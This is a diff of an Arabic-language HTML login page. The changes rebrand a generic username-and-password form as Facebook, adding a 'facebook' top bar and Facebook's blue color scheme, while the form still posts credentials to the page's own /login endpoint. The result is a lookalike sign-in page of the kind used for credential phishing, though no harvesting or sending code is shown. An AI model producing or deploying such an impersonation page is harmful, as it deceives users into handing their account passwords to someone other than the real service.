@@ -4,50 +4,101 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>تسجيل الدخول</title>
+
 <style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
 body{
-    font-family: Arial, sans-serif;
+    font-family:Arial,sans-serif;
     background:#f0f2f5;
+}
+
+/* الشريط العلوي */
+.topbar{
+    background:#1877f2;
+    color:#fff;
+    height:60px;
     display:flex;
     justify-content:center;
     align-items:center;
-    height:100vh;
+    font-size:28px;
+    font-weight:bold;
+    letter-spacing:-1px;
 }
+
+.container{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:calc(100vh - 60px);
+}
+
 .box{
     background:#fff;
     padding:30px;
-    border-radius:10px;
-    width:320px;
+    width:340px;
+    border-radius:8px;
     box-shadow:0 2px 10px rgba(0,0,0,.2);
 }
+
+.box h2{
+    text-align:center;
+    margin-bottom:20px;
+}
+
 input{
     width:100%;
     padding:12px;
     margin:8px 0;
     border:1px solid #ccc;
     border-radius:6px;
+    font-size:15px;
 }
+
 button{
     width:100%;
     padding:12px;
     background:#1877f2;
-    color:white;
+    color:#fff;
     border:none;
     border-radius:6px;
+    font-size:17px;
     cursor:pointer;
 }
+
+button:hover{
+    background:#166fe5;
+}
 </style>
+
 </head>
 <body>
 
+<div class="topbar">
+facebook
+</div>
+
+<div class="container">
+
 <div class="box">
+
 <h2>تسجيل الدخول</h2>
 
 <form action="/login" method="POST">
+
 <input type="text" name="username" placeholder="اسم المستخدم" required>
+
 <input type="password" name="password" placeholder="كلمة المرور" required>
+
 <button type="submit">دخول</button>
+
 </form>
+
+</div>
 
 </div>
 
